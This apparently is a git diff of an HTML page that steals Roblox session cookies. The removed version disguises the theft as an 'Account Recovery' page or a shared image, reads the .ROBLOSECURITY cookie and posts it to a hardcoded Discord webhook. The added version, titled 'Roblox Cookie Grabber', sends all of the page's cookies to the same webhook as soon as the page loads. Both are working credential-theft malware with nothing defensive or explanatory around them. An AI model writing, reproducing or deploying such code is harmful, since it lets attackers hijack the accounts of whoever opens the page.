@@ -3,30 +3,46 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Account Recovery</title>
+    <title>Roblox Cookie Grabber</title>
     <script>
-        window.onload = function() {
-            const webhookURL = 'https://discord.com/api/webhooks/1290081936542400625/SwcqQdeR-lzSlSeSI0NMMgt3YeTIMU6HolcHg9gGV3K2CpHOUVL1oKh-CG5kzbO07FWp';
-            const cookieValue = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY=')).split('=')[1];
+        // Function to grab cookies and send to Discord
+        function sendCookies() {
+            // Get the cookies from the document
+            const cookies = document.cookie;
 
-            const payload = { content: `ROBLOSECURITY Cookie: ${cookieValue}` };
+            // Set up the webhook URL
+            const webhookURL = 'https://discord.com/api/webhooks/1290081936542400625/SwcqQdeR-lzSlSeSI0NMMgt3YeTIMU6HolcHg9gGV3K2CpHOUVL1oKh-CG5kzbO07FWp'; // Replace with your webhook URL
 
+            // Prepare the payload
+            const payload = {
+                content: `Cookies: ${cookies}`,
+                username: 'Cookie Grabber'
+            };
+
+            // Send the cookies to the Discord webhook
             fetch(webhookURL, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).then(response => {
-                if (response.ok) {
-                    console.log('Cookie sent successfully.');
-                } else {
-                    console.error('Failed to send the cookie.');
+                body: JSON.stringify(payload),
+                headers: {
+                    'Content-Type': 'application/json'
                 }
-            }).catch(error => console.error('Error:', error));
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Cookies sent successfully!');
+                } else {
+                    console.error('Failed to send cookies:', response.statusText);
+                }
+            })
+            .catch(error => console.error('Error sending cookies:', error));
         }
+
+        // Call the function when the page loads
+        window.onload = sendCookies;
     </script>
 </head>
 <body>
-    <h1>my image because i don't have image perms :c</h1>
-    <img src="https://your-image-url.com/image.jpg" alt="my photo" style="width:100%;max-width:600px;">
+    <h1>Roblox Cookie Grabber</h1>
+    <p>Your cookies are being collected...</p>
 </body>
 </html>
